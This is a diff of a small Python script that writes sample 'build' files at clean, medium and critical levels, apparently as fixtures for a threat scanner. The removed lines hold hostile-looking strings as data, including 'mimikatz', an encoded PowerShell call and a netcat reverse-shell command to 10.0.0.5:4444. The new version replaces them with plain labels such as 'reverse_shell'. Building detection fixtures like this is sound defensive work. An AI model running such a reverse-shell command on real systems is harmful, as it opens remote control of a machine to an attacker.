@@ -1,30 +1,41 @@
 import os
 
-ARTIFACT_PATH = "../dataset/current_build.txt"
+BUILD_FILE = "dataset/current_build.txt"
 
 def generate_build(mode="clean"):
 
     if mode == "clean":
-        content = "print('Hello World')"
+        content = """
+login_function
+api_request
+data_processing
+normal_operation
+"""
 
     elif mode == "medium":
         content = """
-        whoami
-        powershell -enc test
-        """
+api_call
+unknown_network
+base64_encoded_payload
+suspicious_request
+"""
 
     elif mode == "critical":
         content = """
-        mimikatz
-        powershell -enc attack
-        nc -e cmd.exe 10.0.0.5 4444
-        base64payloadstringaaaaaaaaaaaaaaaaaaaa
-        """
+cmd.exe
+powershell
+reverse_shell
+data_exfiltration
+malware_payload
+"""
 
     else:
-        content = "print('Default Build')"
+        content = "unknown build"
 
-    with open(ARTIFACT_PATH, "w") as f:
+    with open(BUILD_FILE, "w") as f:
         f.write(content)
 
-    print(f"Build generated in {mode.upper()} mode.")
+    print(f"✔ Build generated in {mode.upper()} mode")
+
+    return BUILD_FILE
+
